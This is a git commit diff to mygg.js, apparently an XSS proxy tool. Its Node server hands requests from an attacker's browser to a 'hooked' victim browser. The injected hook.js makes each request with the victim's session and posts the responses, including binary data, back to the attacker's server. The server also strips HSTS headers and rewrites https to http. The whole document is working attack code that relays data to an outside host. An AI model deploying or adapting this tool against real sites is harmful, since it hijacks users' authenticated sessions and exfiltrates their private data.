07221008b32583abfc0eda1d108d762edf751b2e
Daniel Solstad <solstad.daniel@gmail.com>
2020-06-09 23:39:34 +0200

    Update mygg.js
    Added the proper display of images and binary data in general.
    Cleaned up some code.
    Added debug parameter.
    Communication from hooked browser to mygg now is with form-multipart instead of JSON, to better control data types and not needing to urlencode and base64 encode data. To handle formData better, Busboy is now required as a dependancy.

--- mygg.js
+++ mygg.js
@@ -10,7 +10,7 @@ const config = {
     key: './server-key.pem',
     cert: './server-cert.pem',
     // Provides additional debug output
-    debug: 1,
+    debug: 0,
     // If mygg is running on a remote server, then either set proxy_interface to 127.0.0.1 and use ssh+portforwarding
     // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips.
     proxy_interface: '127.0.0.1',
@@ -22,6 +22,7 @@ const web = require(config.web_protocol);
 const proxy = require('http');
 const fs = require('fs');
 const qs = require('querystring');
+const Busboy = require('busboy');
 
 /* 
 task_pending structure:
@@ -54,56 +55,82 @@ proxy.createServer(function (req, res) {
         url = url + '?' + urlObj.searchParams;
     }
     
-    /* Check if request from proxy contains a body */
+    /* Check if request from proxy/attacker contains a body */
     if (req.headers['content-length'] > 0) {
-        var body = '';
+        var data = [];
         req.on('data', function (chunk) {
-            body += chunk;
+            data.push(chunk);
         });
         req.on('end', function () {
-            body_encoded = Buffer.from(body).toString('base64');
-            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body_encoded}
+            // Sends a task to the hooked browser
+            var buffer = Buffer.concat(data);
+            var body = buffer.toString('utf8');
+            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body}
             tasks_pending.push(new_task);
             
+            // Handles the response from the task given to the "victim"
             task_callbacks[new_task.id] = function (result) {
-                var body_decoded = b64decode(result.body);
-                var body_fixed = stripHooks(body_decoded);
-                var body_fixed = https2http(body_fixed);
+                var headers = result.headers;
+                var headers = str2json(headers);
+                var headers = stripHeaders(headers);
+                
+                var content_type = headers['content-type'];
+                
+                /* If the received content type is binary, we need to present it as such.
+                   If is it text, we need to process it before being displayed in the attacking browser. */
+                if (content_type.match(/image|octet-stream/)) {
+                    var body = result.body;
+                } else {
+                    var body = result.body.toString('utf8');
+                    var body = stripHooks(body);
+                    var body = https2http(body);
+                }
 
-                var headers_decoded = b64decode(result.headers);
-                var headers_fixed = str2json(headers_decoded);
-                var headers_fixed = stripHeaders(headers_fixed);
-                var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
+                var body_length = body.length;
+                var headers = updateContentLength(headers, body_length);
 
-                console.log("[+] Received status: " + result.status);
-                if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers_fixed); }
-                if (config.debug) { console.log("[+] Received body:\n" + body_fixed); }
-                console.log("[+] -------------------------------- [+]");
+	            console.log("[+] Received status: " + result.status);
+	            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+	            if (config.debug) { console.log("[+] Received body:\n" + body); }
+	            console.log("[+] -------------------------------- [+]");
 
-                res.writeHead(result.status, headers_fixed);
-                res.end(body_fixed);
+                res.writeHead(result.status, headers);
+                res.end(body);
             };
         });
 	} else {
+        /* Sends a task to the hooked browser. */
         var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
         tasks_pending.push(new_task);
+    
+        /* Handles the response from the task given to the hooked browser. */
         task_callbacks[new_task.id] = function (result) {
-            var body_decoded = b64decode(result.body);
-            var body_fixed = stripHooks(body_decoded);
-            var body_fixed = https2http(body_fixed);
+            var headers = result.headers;
+            var headers = str2json(headers);
+            var headers = stripHeaders(headers);
+            
+            var content_type = headers['content-type'];
+            
+            /* If the received content type is binary, we need to present it as such.
+               If is it text, we need to process it before being displayed in the attacking browser. */
+            if (content_type.match(/image|octet-stream/)) {
+                var body = result.body;
+            } else {
+                var body = result.body.toString('utf8');
+                var body = stripHooks(body);
+                var body = https2http(body);
+            }
 
-            var headers_decoded = b64decode(result.headers);
-            var headers_fixed = str2json(headers_decoded);
-            var headers_fixed = stripHeaders(headers_fixed);
-            var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
+            var body_length = body.length;
+            var headers = updateContentLength(headers, body_length);
 
-	    console.log("[+] Received status: " + result.status);
-	    if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers_fixed); }
-	    if (config.debug) { console.log("[+] Received body:\n" + body_fixed); }
-	    console.log("[+] -------------------------------- [+]");
+	        console.log("[+] Received status: " + result.status);
+	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+	        if (config.debug) { console.log("[+] Received body:\n" + body); }
+	        console.log("[+] -------------------------------- [+]");
 
-            res.writeHead(result.status, headers_fixed);
-            res.end(body_fixed);
+            res.writeHead(result.status, headers);
+            res.end(body);
         };
     }
 
@@ -123,6 +150,7 @@ const https_options = {
     key: fs.readFileSync(config.key),
     cert: fs.readFileSync(config.cert)
 };
+
 web.createServer(https_options, function (req, res) {
     var ipaddr = req.connection.remoteAddress;
     var useragent = req.headers['user-agent'];
@@ -134,11 +162,17 @@ web.createServer(https_options, function (req, res) {
         console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
     /* Hooked browser asks mygg if there are any new jobs for it */
     } else if (req.url == '/polling') {
-        res.setHeader('Access-Control-Allow-Origin', '*')
-        res.setHeader('Access-Control-Allow-Headers', '*')
-        res.setHeader('Content-Type', 'application/json')
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Headers', '*');
+        res.setHeader('Content-Type', 'application/json');
+
         if (tasks_pending.length > 0) {
             data = JSON.stringify(tasks_pending);
+            if (config.debug) { 
+                console.log("[+] Tasks pending"); 
+                console.log(data); 
+                console.log("[+] -------------------------------- [+]");
+            }
             res.writeHead(200);
             res.end(data);
             tasks_pending = []
@@ -146,19 +180,39 @@ web.createServer(https_options, function (req, res) {
             res.writeHead(404)
             res.end();
         }
-    /* Catching the responses */
+    /* Catching the performed requests from the hooked browser */
     } else if (req.url == '/responses' && req.method == 'POST') {
-        var body = '';
-        req.on('data', function (chunk) {
-            body += chunk;
+
+        var busboy = new Busboy({ headers: req.headers });
+        var response = {};
+
+        busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
+            response[fieldname] = [];
+            //console.log('File [' + fieldname + ']: filename: ' + filename + ', encoding: ' + encoding + ', mimetype: ' + mimetype);
+            file.on('data', function(data) {
+                //console.log('File [' + fieldname + '] got ' + data.length + ' bytes');
+                response[fieldname].push(data);
+            });
+            file.on('end', function() {
+                //console.log('File [' + fieldname + '] Finished');
+                response[fieldname] = Buffer.concat(response[fieldname]);
+            });
         });
-        req.on('end', function () {
-            var result = qs.parse(body);
-            var handler = task_callbacks[result.id];
-            handler(result);
-            res.writeHead(200);
+
+        busboy.on('field', function(fieldname, val, fieldnameTruncated, valTruncated, encoding, mimetype) {
+            //console.log('Field [' + fieldname + ']: value: ' + inspect(val));
+            response[fieldname] = val;
+        });
+        busboy.on('finish', function() {
+            // Runs the callback for the associated request ID
+            var handler = task_callbacks[response['id']];
+            handler(response);
+
+            res.writeHead(200, { Connection: 'close' });
             res.end();
         });
+
+        req.pipe(busboy);
 
     } else {
         res.writeHead(404);
@@ -170,14 +224,6 @@ web.createServer(https_options, function (req, res) {
     console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
 });
 
-/* https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/Base64_encoding_and_decoding#The_Unicode_Problem */
-/* Doesn't work */
-function b64decode(str) {
-    var decoded = Buffer.from(str, 'base64').toString('binary');
-    return decodeURIComponent(decoded.split('').map(function(c) {
-        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-    }).join(''));
-}
 
 /* Removes HSTS header */
 function stripHeaders(headers) {
@@ -198,7 +244,7 @@ function https2http(body) {
 }
 
 /* Sets the content-length header */
-function fixContentLength(headers, new_length) {
+function updateContentLength(headers, new_length) {
     headers['Content-Length'] = new_length;
     return headers;
 }
@@ -221,38 +267,42 @@ x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendCh
 console.log("[+] Payload:\r\n" + hook + "\r\n");
 
 var hook_file = `
-function b64encode(str) {
-    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
-        function toSolidBytes(match, p1) {
-            return String.fromCharCode('0x' + p1);
-    }));
-}
 function makeRequest(id, method, url, head, body) {
+    // Forcing the "victim" browser to perform the request
     var target_http = new XMLHttpRequest();
-    target_http.onreadystatechange = function() {       
+    target_http.responseType = 'blob';
+    target_http.onreadystatechange = function() {
+
+        // Sending the response back to mygg
         if (target_http.readyState == 4) {
-            var mygg_http = new XMLHttpRequest();
-            mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
-            var resp_status = target_http.status;
-            var resp_body = encodeURIComponent(b64encode(target_http.responseText));
-            var resp_headers = encodeURIComponent(b64encode(target_http.getAllResponseHeaders()));
+            var formData = new FormData();
+            formData.append('id', id);
+            formData.append('method', method);
+            formData.append('url', url);
+
             // Checking if the browser got a redirect
             if (url == getPath(target_http.responseURL)) {
-                var data = "id="+id.toString()+"&url="+url+"&status="+resp_status+"&headers="+resp_headers+"&body="+resp_body;
+                formData.append('status', target_http.status);
+                formData.append('headers', target_http.getAllResponseHeaders());
+                var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
+                formData.append('body', blob);
             } else {
                 // Need to redirect the attacking browser too
-                var redirect = b64encode("Location: " + target_http.responseURL);
-                var data = "id="+id.toString()+"&url="+url+"&status=301"+"&headers="+redirect+"&body="
+                formData.append('status', '301');
+                formData.append('head', "Location: " + target_http.responseURL);
             }
-            mygg_http.send(data);
+
+            var mygg_http = new XMLHttpRequest();
+            mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
+            mygg_http.send(formData);
         }
+
     };
+    
     target_http.open(method, url, true);
-    //for (var key in head) {
-     //   target_http.setRequestHeader(key, head[key]) 
-    //}
+    //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
     if (body) {
-        target_http.send(atob(body));
+        target_http.send(body);
     } else {
         target_http.send();
     }
@@ -264,10 +314,11 @@ function poll() {
     var mygg_http = new XMLHttpRequest();
     mygg_http.onreadystatechange = function () {
         if (mygg_http.readyState == 4 && mygg_http.status == 200) {
-            console.log("FROM POLLING:")
+            console.log("Got new task:")
             console.log(mygg_http.responseText)
             var tasks = JSON.parse(mygg_http.responseText);
             for (var i in tasks){
+                console.log("TASK");console.log(tasks[i]);
                 makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
             }
         }
